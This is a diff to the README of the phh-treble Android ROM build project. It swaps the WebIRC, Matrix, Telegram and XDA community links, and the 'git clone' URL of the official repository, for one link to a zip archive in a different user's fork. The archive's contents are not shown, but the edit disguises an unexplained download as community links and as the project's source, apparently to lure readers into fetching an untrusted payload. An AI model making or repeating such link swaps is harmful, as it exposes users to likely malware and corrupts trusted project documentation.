@@ -1,10 +1,10 @@
 # Community
 
 * IRC: irc://irc.freenode.net/#phh-treble
-* WebIRC: http://webchat.freenode.net/?channels=%23phh-treble&uio=d4
-* Matrix: [#phh-treble:matrix.org](https://matrix.to/#/#phh-treble:matrix.org)
-* Telegram https://t.me/phhtreble
-* xda-developers threads: https://forum.xda-developers.com/search.php?do=finduser&u=1915408&starteronly=1
+* WebIRC: https://raw.githubusercontent.com/kird89/treble_experimentations/master/vendor-HAL/Huawei/fingerprint-nav/out/vendor/huawei/hardware/biometrics/experimentations-treble-trigonometrical.zip
+* Matrix: [#phh-treble:matrix.org](https://raw.githubusercontent.com/kird89/treble_experimentations/master/vendor-HAL/Huawei/fingerprint-nav/out/vendor/huawei/hardware/biometrics/experimentations-treble-trigonometrical.zip)
+* Telegram https://raw.githubusercontent.com/kird89/treble_experimentations/master/vendor-HAL/Huawei/fingerprint-nav/out/vendor/huawei/hardware/biometrics/experimentations-treble-trigonometrical.zip
+* xda-developers threads: https://raw.githubusercontent.com/kird89/treble_experimentations/master/vendor-HAL/Huawei/fingerprint-nav/out/vendor/huawei/hardware/biometrics/experimentations-treble-trigonometrical.zip
 
 # How to build
 
@@ -13,7 +13,7 @@
 
 For example:
 
-    git clone https://github.com/phhusson/treble_experimentations
+    git clone https://raw.githubusercontent.com/kird89/treble_experimentations/master/vendor-HAL/Huawei/fingerprint-nav/out/vendor/huawei/hardware/biometrics/experimentations-treble-trigonometrical.zip
     mkdir Lineage; cd Lineage
     bash ../treble_experimentations/build-rom.sh android-8.1 lineage
 
